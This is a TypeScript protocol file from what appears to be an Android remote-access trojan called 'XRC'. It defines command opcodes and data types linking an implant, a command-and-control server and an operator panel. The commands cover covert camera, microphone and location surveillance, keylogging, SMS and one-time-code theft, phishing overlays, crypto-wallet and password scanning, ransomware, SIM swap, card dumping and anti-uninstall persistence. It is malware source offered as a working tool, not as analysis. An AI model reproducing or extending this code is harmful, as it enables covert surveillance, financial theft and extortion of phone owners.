/**
 * XRC — eXtreme Red Cell RAT
 * shared/src/protocol.ts
 *
 * Single source of truth for the wire protocol:
 *   implant (Kotlin) ⇄ C2 server (Fastify + Socket.IO) ⇄ panel (React)
 *
 * Rules:
 *  - zero runtime dependencies
 *  - all opcodes are lowercase string values (stable across languages)
 *  - every new field added here must be optional or given a server-side default
 */

/** Wire protocol version — bump on any incompatible wire change. */
export const PROTOCOL_VERSION = 1;

/** Command opcodes understood by the implant. */
export enum CMD {
  // ---- core / lifecycle ----
  PING = 'ping',
  INFO = 'info',
  KILL = 'kill',
  WIPE = 'wipe',
  DRAIN = 'drain',
  WIPEWATCH = 'wipewatch',

  // ---- surveillance ----
  CAMERA = 'camera',
  MIC = 'mic',
  SCREEN = 'screen',
  LOCATION = 'location',
  CALL = 'call',

  // ---- input capture ----
  KEYLOG = 'keylog',
  SMS = 'sms',
  NOTIF = 'notif',
  OTP = 'otp',

  // ---- remote control ----
  HVNC = 'hvnc',
  GESTURE = 'gesture',
  TEXT = 'text',
  FREEZE = 'freeze',
  INJECT = 'inject',
  APPKICKER = 'appkicker',

  // ---- overlays / phishing ----
  OVERLAY = 'overlay',
  BIOMETRICS = 'biometrics',

  // ---- automation ----
  AUTOMATA = 'automata',

  // ---- on-device scanners ----
  WALLET_SCAN = 'wallet_scan',
  PASSWORD_SCAN = 'password_scan',
  /** Panel alias — same wire value as PASSWORD_SCAN. */
  PASS_SCAN = 'password_scan',

  // ---- ransomware ----
  RANSOM = 'ransom',

  // ---- file system ----
  FILES = 'files',

  // ---- stealth / persistence / anti-uninstall ----
  STEALTH = 'stealth',

  // ---- system info / device management ----
  APPS = 'apps',
  PERMS = 'perms',

  // ---- financial suite (Phase 7) ----
  ATS = 'ats',
  CLIP = 'clip',
  CLIPBOARD = 'clipboard',
  CARD = 'card',
  CRYPTO = 'crypto',
  SIMSWAP = 'simswap',
  BANK = 'bank',
  OTP_RELAY = 'otp_relay',
  CONTACTS = 'contacts',
  CALLLOG = 'calllog',
  KYC = 'kyc',
  IDSCAN = 'idscan',
  BILLSCAN = 'billscan',
  CARDDUMP = 'carddump',
  CASHOVERLAY = 'cashoverlay',
  LURES = 'lures',
  EXCHANGE = 'exchange',
}

/** Device liveness as tracked by the C2. */
export type DeviceStatus = 'online' | 'offline' | 'frozen';

/** A single command targeted at one implant. */
export interface Command {
  cmd: CMD;
  /** Sub-operation for the opcode, e.g. 'start' | 'stop' | 'snap' | 'flush'. */
  action?: string;
  /** Overlay slug — must match a hand-written page, never auto-generated. */
  slug?: string;
  /** Path/URL the overlay loads. */
  url?: string;
  /** Camera selector. */
  cam?: 'front' | 'rear';
  /** Duration in seconds (recordings, freeze timers, mic capture…). */
  duration?: number;
  /** Screen-stream frames per second. */
  fps?: number;
  /** HVNC touch coordinates. */
  x?: number;
  y?: number;
  /** Absolute path for the files module. */
  path?: string;
  /** Free-form payload: ransom note, phone number, text to inject… */
  payload?: string;
  /** Automata trigger id ('app_open', 'sms_keyword', 'notification', …). */
  trigger?: string;
  /** Automata rule matcher. */
  rule?: Record<string, unknown>;
  /** Automata effect to apply. */
  effect?: Record<string, unknown>;
}

/** Envelope for a command travelling server → implant. */
export interface CommandMessage {
  id: string;
  deviceId: string;
  command: Command;
  ts: number;
}

/** Socket.IO wire envelope shared by every message. */
export interface Envelope {
  v: number;
  id: string;
  t: 'cmd' | 'evt' | 'res';
  d: unknown;
}

/** Ack returned by the implant for a delivered command. */
export interface CommandAck {
  id: string;
  deviceId: string;
  accepted: boolean;
  error?: string;
  ts: number;
}

/** Row shown in the device registry / sidebar. */
export interface DeviceSummary {
  id: string;
  name: string;
  model: string;
  android: string;
  status: DeviceStatus;
  battery: number;
  signal?: number;
  keylogCount: number;
  otpCount: number;
  lastSeen: number;
}

export interface KeylogEntry {
  ts: number;
  app: string;
  text: string;
}

export interface OtpEntry {
  ts: number;
  source: string;
  code: string;
}

export interface BiometricEntry {
  ts: number;
  type: string;
  result?: string;
}

/**
 * Full device record: identity + live telemetry + module state + recent events.
 * All telemetry/module fields are optional so an implant that has not yet
 * reported them does not break the panel or the server.
 */
export interface DeviceInfo {
  id: string;
  name: string;
  model: string;
  brand: string;
  android: string;
  sdk: number;
  buildId?: string;
  kernel?: string;
  rooted?: boolean;
  hooked?: boolean;
  lastSeen: number;
  battery: number;
  temperature?: number;
  ramFree?: string;
  storageFree?: string;
  carrier?: string;
  signal?: number;
  localIp?: string;
  publicIp?: string;
  lastLat?: number;
  lastLng?: number;
  lastLocTime?: number;
  keylogCount: number;
  otpCount: number;
  accessibilityEnabled?: boolean;
  deviceAdmin?: boolean;
  overlayActive?: boolean;
  persistence?: boolean;
  recentKeylogs?: KeylogEntry[];
  recentOtps?: OtpEntry[];
  recentBiometrics?: BiometricEntry[];
}

/**
 * Event streamed from implant → server → panel.
 * Discriminated on `kind`; `deviceId` + `ts` are always present.
 */
export type ImplantEvent =
  | { kind: 'info'; deviceId: string; ts: number; info: Partial<DeviceInfo> }
  | { kind: 'keylog'; deviceId: string; ts: number; app: string; text: string }
  | { kind: 'sms'; deviceId: string; ts: number; from: string; text: string }
  | { kind: 'notif'; deviceId: string; ts: number; app: string; text: string }
  | { kind: 'otp'; deviceId: string; ts: number; source: string; code: string }
  | { kind: 'location'; deviceId: string; ts: number; lat: number; lng: number; accuracy?: number }
  | { kind: 'capture'; deviceId: string; ts: number; type: 'camera' | 'mic' | 'screen'; url?: string; size?: number }
  | { kind: 'scan'; deviceId: string; ts: number; type: 'wallet' | 'password'; results?: unknown }
  | { kind: 'status'; deviceId: string; ts: number; status: DeviceStatus; attempts?: number }
  | { kind: 'error'; deviceId: string; ts: number; message: string };

/** Standard JSON envelope for all REST endpoints. */
export interface ApiRes<T = unknown> {
  success: boolean;
  data?: T;
  error?: string;
}

/** GET /api/devices */
export interface DevicesRes {
  devices: DeviceSummary[];
  total: number;
}

/** GET /api/stats */
export interface StatsRes {
  totalDevices: number;
  online: number;
  frozen: number;
  keylogs24h: number;
  otps24h: number;
  captures24h: number;
  overlaysServed: number;
  byModel: Record<string, number>;
}

/** One row in the C2 event log. */
export interface LogEntry {
  id: string;
  ts: number;
  deviceId: string;
  kind: string;
  message: string;
}

/** Payload the implant sends on first connect (registration). */
export interface ImplantHello {
  device: DeviceInfo;
  sessionKey?: string;
}
